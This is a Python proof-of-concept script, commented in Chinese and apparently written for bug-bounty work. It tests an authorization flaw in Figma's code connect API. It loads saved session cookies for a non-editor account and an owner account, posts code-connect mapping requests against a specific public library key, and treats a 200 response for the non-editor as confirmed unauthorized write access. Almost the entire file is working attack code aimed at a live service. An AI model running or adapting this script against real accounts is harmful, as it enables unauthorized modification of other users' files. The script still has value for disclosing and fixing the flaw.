# -*- coding: utf-8 -*-
# createCodeConnectMap 越权对照: B(无权限) vs A(owner) + remove_repository_mapping 对照组
# 目标结果: B 对 A 的 view 公开库创建 code connect map 成功(200)= 越权确认
import sys, json, io
import requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

FK = "bv2nMIdFf4u3dESGail4sm"
LK = "lk-d12a96bab0f2515990ccf0c32d4ad7d6737ae1317c046dcc45bd44b14b69d3e20b92eb4abc1308e300a534cce3a62827e978ae66ee052d1e60a86fcdf833b2ca"
NODE = "71:3276"  # 组件节点(用户选中组件,URL node-id=71-3276)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
CKA = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
CKB = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
HDR = {"Origin": "https://www.figma.com", "Referer": f"https://www.figma.com/file/{FK}",
       "User-Agent": UA, "Content-Type": "application/json"}

def create_map(cookie, node_id, extra=None):
    body = {"library_key": LK, "node_id": node_id, "template": "",
            "component_name": "ProbeButton", "source_path": "src/ProbeButton.tsx",
            "language": "React", "status": "connected", "origin": "mcp_local",
            "entrypoint": ""}
    if extra: body.update(extra)
    r = requests.post("https://www.figma.com/api/code_connect/map",
                      headers={**HDR, "Cookie": cookie}, json=body, timeout=30)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text[:200]

def remove_repo_map(cookie):
    r = requests.post(f"https://www.figma.com/api/integrations/github-app/figma-make/{FK}/remove_repository_mapping",
                      headers={**HDR, "Cookie": cookie}, json={}, timeout=30)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text[:200]

print(f"=== 目标: {FK} view公开, LK={LK[:20]}... node={NODE} ===")
print("\n[1] B(无编辑权) createCodeConnectMap:")
st, j = create_map(CKB, NODE)
print(f"    B create: {st} {json.dumps(j, ensure_ascii=False)[:400]}")

print("\n[2] 对照组 B remove_repository_mapping(证明 B 无编辑权):")
st, j = remove_repo_map(CKB)
print(f"    B remove_repo: {st} {json.dumps(j, ensure_ascii=False)[:200]}")

print("\n[3] A(owner) 基线 createCodeConnectMap 同 node:")
st, j = create_map(CKA, NODE)
print(f"    A create: {st} {json.dumps(j, ensure_ascii=False)[:400]}")
